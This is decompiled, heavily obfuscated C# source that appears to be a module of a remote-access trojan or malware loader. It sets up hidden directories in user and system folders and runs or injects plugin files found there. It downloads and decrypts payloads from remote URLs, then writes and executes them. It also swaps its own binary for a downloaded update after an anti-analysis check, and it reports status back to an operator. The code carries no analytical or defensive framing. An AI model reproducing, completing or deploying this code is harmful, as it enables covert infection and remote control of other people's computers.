using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[StandardModule]
internal sealed class ______________________
{
	public static string _;

	public static string __;

	public static string ___;

	public static string ____;

	public static string _____;

	private static string m_______;

	public static int _______;

	public static void _()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num7 = default(int);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Exception obj2);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0009;
				case 336:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 4:
							goto IL_0057;
						case 3:
							goto IL_006e;
						case 5:
						case 6:
							goto IL_0099;
						case 7:
							goto IL_00c2;
						case 8:
						case 9:
							goto IL_00de;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00de:
					num = 9;
					if (Directory.Exists(______________________.m_______))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0009:
					num = 2;
					______________________.m_______ = Environment.GetEnvironmentVariable(_003CModule_003E.___<string>(3881272295u)) + _003CModule_003E._______<string>(3427012921u);
					if (~(-(num5 * -662700032)) == 32 * -(num5 * 397 + 115 * num5))
					{
						num6 = (nint)Type.EmptyTypes.LongLength + -1674056822;
						goto IL_0061;
					}
					goto IL_006e;
					IL_00c2:
					num = 7;
					______________________.m_______ = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + _003CModule_003E._____<string>(305124521u);
					goto IL_00de;
					IL_006e:
					num = 3;
					if (!Directory.Exists(______________________.m_______))
					{
						goto IL_0057;
					}
					goto IL_0099;
					IL_0057:
					num = 4;
					num6 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0061;
					IL_0061:
					switch (num6)
					{
					case 0:
						goto IL_007e;
					}
					goto IL_006e;
					IL_007e:
					______________________.m_______ = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + _003CModule_003E._______<string>(3427012921u);
					goto IL_0099;
					IL_0099:
					num = 6;
					num5 = -21224;
					if ((0xFFFFF1A7u ^ ((uint)num7 / 134217728u)) == 0)
					{
						goto default;
					}
					if (!Directory.Exists(______________________.m_______))
					{
						goto IL_00c2;
					}
					goto IL_00de;
					end_IL_0000_2:
					break;
				}
				num = 10;
				______________________.m_______ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.______<string>(824110388u);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				obj2 = obj as Exception;
				_003CModule_003E.__________ = num2;
				return obj2 != null && num3 != 0 && num2 == 0;
			}).Invoke())
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 336;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			_();
			int num = 13337;
			try
			{
				num = Convert.ToInt32(______________________________________________________________._______________________);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				num = 133337;
				ProjectData.ClearProjectError();
			}
			int num2 = default(int);
			int num3 = default(int);
			if (((16 * num2 + 16 * num2) ^ 0x1DD) != -3541)
			{
				______________________._ = ______________________.m_______ + ______________________________________________________________._______________________ + _003CModule_003E.___<string>(3619323560u);
				______________________.__ = ______________________.m_______ + (num - 100) + _003CModule_003E.___<string>(3619323560u);
				num3 = 8344;
			}
			______________________.___ = ______________________._ + (num - 99) + _003CModule_003E._____<string>(305124521u);
			int num4 = num3;
			num3 = -4685;
			if (num4 == 8344)
			{
				______________________._____ = ______________________._ + (num - 98) + _003CModule_003E.___<string>(3619323560u);
				if (num3 == 29001)
				{
				}
			}
			______________________.____ = ______________________._ + (num - 97) + _003CModule_003E.____<string>(2151898393u);
			___(______________________._);
			___(______________________.__);
			___(______________________.___);
			___(______________________._____);
			___(______________________.____);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___(string string_0)
	{
		try
		{
			if (!Directory.Exists(string_0))
			{
				Directory.CreateDirectory(string_0);
			}
			_____________________________________________________________________________._______________(string_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = string_0;
			process.Start();
			______________________________________________________________________________._____(process.Id);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public unsafe static void _____()
	{
		_____________________________________________________________________________.________________(______________________.____);
		try
		{
			string[] files = Directory.GetFiles(______________________.____);
			int num = 0;
			string text2 = default(string);
			int num2 = default(int);
			int num3 = default(int);
			while (true)
			{
				if (num < files.Length)
				{
					string text = files[num];
					try
					{
						_____________________________________________________________________________._________________(text);
						if (text.Contains(_003CModule_003E.___<string>(3175546013u)))
						{
							switch ((nint)Type.EmptyTypes.LongLength + 0)
							{
							default:
								____(text);
								break;
							}
						}
						else if (text.Contains(_003CModule_003E.___<string>(2712258147u)))
						{
							Process.Start(text);
						}
						else if (text.Contains(_003CModule_003E.____<string>(2933530494u)) | text.Contains(_003CModule_003E.___<string>(1300805583u)))
						{
							_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, File.ReadAllBytes(text), bool_0: true, bool_1: true);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					if ((num << 20) + 5009 + 483840 != (int)((uint)(~(1073741824 * num)) >> 17))
					{
						num++;
						continue;
					}
					break;
				}
				text2 = ______________________.____ + _003CModule_003E.______<string>(4254570386u);
				nint num4;
				if ((((int)((uint)num2 % 117u) - -9776) & -4608) != 9728)
				{
					if ((0x1881u ^ (uint)(-(104 * num2 + 24 * num2))) != 0)
					{
						if (num3 * 820 + num3 * 204 != 7798)
						{
							goto IL_016e;
						}
						num4 = (nint)Type.EmptyTypes.LongLength + 427251172;
					}
					else
					{
						num4 = sizeof(Guid) + 1922351617;
					}
				}
				else
				{
					num4 = (nint)Type.EmptyTypes.LongLength + 1;
				}
				goto IL_0193;
				IL_0193:
				switch (num4)
				{
				case 0:
					goto end_IL_0018;
				}
				goto IL_016e;
				IL_016e:
				if (File.Exists(text2))
				{
					break;
				}
				_____________________________________________________________________________._______________(______________________.____);
				File.WriteAllText(text2, string.Empty);
				num4 = sizeof(byte) + -1;
				goto IL_0193;
				continue;
				end_IL_0018:
				break;
			}
			FileSystem.FileOpen(2, text2, (OpenMode)1, (OpenAccess)(-1), (OpenShare)0, -1);
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += ___________;
			timer.Interval = 50000.0;
			timer.Start();
			Thread.Sleep(-1);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void ______()
	{
		try
		{
			string text = _003CModule_003E.___<string>(534469697u);
			string[] files = Directory.GetFiles(______________________.____);
			foreach (string path in files)
			{
				try
				{
					string fileName = Path.GetFileName(path);
					if (Operators.CompareString(fileName, _003CModule_003E._____<string>(3601540063u), false) != 0 && !fileName.Contains(______________________________________________________________._______________________))
					{
						text = text + fileName + _003CModule_003E._______<string>(1693661660u);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (!text.Contains(_003CModule_003E.______<string>(4019682797u)))
			{
				______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.___<string>(1945922261u));
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E.______<string>(2043928306u), text);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.____<string>(1187660804u), _003CModule_003E.___<string>(2974206882u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void _______()
	{
		_____________________________________________________________________________.________________(______________________.____);
	}

	public static void ________(string string_0)
	{
		try
		{
			string text = ______________________.____ + string_0;
			if (File.Exists(text))
			{
				switch ((nint)Type.EmptyTypes.LongLength + 0)
				{
				default:
				{
					_____________________________________________________________________________._______________(______________________.____);
					_____________________________________________________________________________._______________(text);
					Thread.Sleep(1500);
					Random random = new Random();
					((ServerComputer)_____________._).get_FileSystem().MoveFile(text, Path.GetTempPath() + random.Next(1000, 9000));
					______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.___<string>(2188360677u) + string_0);
					break;
				}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(2043928306u), _003CModule_003E.___<string>(1422024791u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
		_____________________________________________________________________________.________________(______________________.____);
	}

	public unsafe static void _________(string string_0, string string_1)
	{
		try
		{
			string text = ______________________.____ + string_1;
			if (File.Exists(text))
			{
				return;
			}
			int num = -31590;
			int num2 = default(int);
			int num3;
			int num4 = default(int);
			if (num2 * 927 + 1121 * num2 != -9147)
			{
				num3 = -21421;
			}
			else
			{
				num4 = 1136733322;
				num3 = 1136733322;
			}
			nint num11;
			if (num3 != -7780)
			{
				WebClient webClient = new WebClient();
				byte[] array = webClient.DownloadData(string_0);
				if (string_1.Contains(_003CModule_003E.______<string>(2713034155u)))
				{
					int ______________ = default(int);
					if (num == 28854)
					{
						______________ = _003CModule_003E._______________;
						if ((((uint)______________ % 22u / 647u) ^ 0x4000039Eu) != 0)
						{
						}
					}
					nint num5 = (nint)Type.EmptyTypes.LongLength + 70811;
					int _______________ = _003CModule_003E.________________;
					nint num7;
					int num8 = default(int);
					if ((uint)_______________ / 251703u % 61002u != 2181715784u)
					{
						int num6 = _003CModule_003E.___________;
						if (7980032 + num6 + num6 == num6 << 1)
						{
							num7 = (((uint)num6 % 1024u == 3122031260u) ? ((nint)Type.EmptyTypes.LongLength + -1814645102) : ((nint)Type.EmptyTypes.LongLength + 1732866803));
						}
						else
						{
							num8 = _003CModule_003E._____________;
							num7 = ((num8 + 5270 - 2083 == (num8 | 0x1082)) ? 2100245301 : ((nint)Type.EmptyTypes.LongLength + 248));
						}
					}
					else if ((-(_______________ & 0xCC8) | -3) == -3)
					{
						if ((((uint)_______________ % 4036271u) ^ 0x8005CBu) != 0)
						{
							num7 = (nint)Type.EmptyTypes.LongLength + -1062256191;
						}
						else
						{
							int num9 = _003CModule_003E.______________;
							if ((((uint)(num9 << 17) / 512u) | 0x89FFFFD2u) != 2315255762u)
							{
								num7 = (((0x16F1u & (uint)(2097152 * num9)) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1441680308) : (sizeof(Guid) + 510997079));
							}
							else
							{
								num2 = global::___________._;
								num7 = sizeof(long) + -1940606279;
							}
						}
					}
					else
					{
						num7 = -403452942;
					}
					File.WriteAllBytes(text, ___________________________________________________________________._______(array, _003CModule_003E.__________(69943, (int)num5, (int)num7)));
					if ((~((uint)num8 / 24460871u) & 0x8000D97) == 0)
					{
						goto IL_0452;
					}
					if ((-3 | (2 * ______________ + 6 * ______________ - 800457277)) == -1)
					{
						int num10 = default(int);
						if (((uint)(num10 + num10 - -8244) ^ 0x1E0Bu) != 0)
						{
							num11 = (nint)Type.EmptyTypes.LongLength + 2;
						}
						else if (((uint)(~(-523283 | num4) * num4) & (true ? 1u : 0u)) != 0 && (~num4 & 0x40) != 64)
						{
							num11 = (nint)Type.EmptyTypes.LongLength + -1909049785;
						}
						else
						{
							if (~(num2 * 2097152) != (int)((0x1A31 ^ ((uint)num2 >> 30)) >> 13))
							{
								int num12 = 1492554320;
								goto IL_0452;
							}
							if (((uint)(num * 524288) ^ 0x5822u) != 0 && -(-2097152000 * num) != 1455)
							{
								int num13 = _003CModule_003E.___________;
								if (((num13 * -2046820352 - 6655) ^ 0xB82) == 0)
								{
									int num14 = ______________________._______;
									num11 = (((int)(~((uint)num14 / 1073741824u)) < 0 || (0x20001F86u & (uint)(num14 | num14)) != 0) ? ((nint)Type.EmptyTypes.LongLength + 1778078798) : ((nint)Type.EmptyTypes.LongLength + 1903888396));
								}
								else
								{
									num11 = (nint)Type.EmptyTypes.LongLength + -1504313212;
								}
							}
							else
							{
								num11 = (nint)Type.EmptyTypes.LongLength + 1685938017;
							}
						}
					}
					else
					{
						int ______________2 = _003CModule_003E._______________;
						if ((-9937 | (111230976 * ______________2)) != -9937)
						{
							goto IL_0452;
						}
						num11 = (nint)Type.EmptyTypes.LongLength + 335456222;
					}
				}
				else if (string_1.Contains(_003CModule_003E.____<string>(1400700540u)))
				{
					File.WriteAllBytes(text, array);
					int num12 = default(int);
					int num9 = default(int);
					num11 = (((0x2520u & ((uint)num12 / 12083u / 734276768u)) != 0) ? ((nint)Type.EmptyTypes.LongLength + 1705573932) : (((uint)num9 % 8388608u == 3326501867u) ? ((nint)Type.EmptyTypes.LongLength + -1963884205) : ((-620756992 + num == num) ? ((nint)Type.EmptyTypes.LongLength + 1701880195) : (((0x400000C3u ^ ((uint)num2 / 9u)) != 0) ? 0 : ((nint)Type.EmptyTypes.LongLength + 1671193448)))));
				}
				else
				{
					File.WriteAllBytes(text, array);
					____(text);
					______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.____<string>(664719811u) + string_1);
					num11 = (nint)Type.EmptyTypes.LongLength + 3;
				}
				goto IL_047d;
			}
			goto IL_0494;
			IL_0494:
			if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, File.ReadAllBytes(text), bool_0: true, bool_1: true))
			{
				______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.______<string>(3658478344u) + string_1);
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E.______<string>(989913392u) + string_1);
			}
			return;
			IL_047d:
			switch (num11)
			{
			case 1:
				goto IL_0494;
			}
			goto IL_0452;
			IL_0452:
			if (string_1.Contains(_003CModule_003E._______<string>(1529344016u)) | string_1.Contains(_003CModule_003E._______<string>(3649441390u)))
			{
				num11 = sizeof(short) + -1;
				goto IL_047d;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E.______<string>(3644661427u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void __________(string string_0, bool bool_0, bool bool_1)
	{
		string text = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			if (_________________________________________________._________())
			{
				______________________________________________________________.______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E._____<string>(100257919u));
				return;
			}
			byte[] array;
			try
			{
				array = webClient.DownloadData(string_0);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				______________________________________________________________.______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E.______<string>(308955237u) + ex2.ToString());
				ProjectData.ClearProjectError();
				return;
			}
			_________________________________________________________________.__();
			_____________________________________________________________________________._______________(______________________.__);
			_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
			if (bool_0)
			{
				try
				{
					string text2 = Convert.ToBase64String(File.ReadAllBytes(_____________________________________________________________________________.__));
					string text3 = Convert.ToBase64String(array);
					if (Operators.CompareString(text2, text3, false) == 0)
					{
						return;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			Random random = new Random();
			if (File.Exists(_____________________________________________________________________________.__))
			{
				text = Path.GetTempPath() + random.Next(1000, 9000);
				((ServerComputer)_____________._).get_FileSystem().MoveFile(_____________________________________________________________________________.__, text);
			}
			File.WriteAllBytes(_____________________________________________________________________________.__, array);
			if (bool_1)
			{
				______________________________________________________________.______________(_003CModule_003E.______<string>(2043928306u), _003CModule_003E.______<string>(1282033260u));
				Process.Start(_____________________________________________________________________________.__);
				ProjectData.EndApp();
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E._____<string>(1464211711u), _003CModule_003E.______<string>(991878003u));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E.______<string>(1283997871u) + ex4.ToString());
			try
			{
				if (!File.Exists(_____________________________________________________________________________.__))
				{
					((ServerComputer)_____________._).get_FileSystem().MoveFile(text, _____________________________________________________________________________.__);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	[DebuggerStepThrough]
	private static void ___________(object sender, ElapsedEventArgs e)
	{
		_______();
	}
}
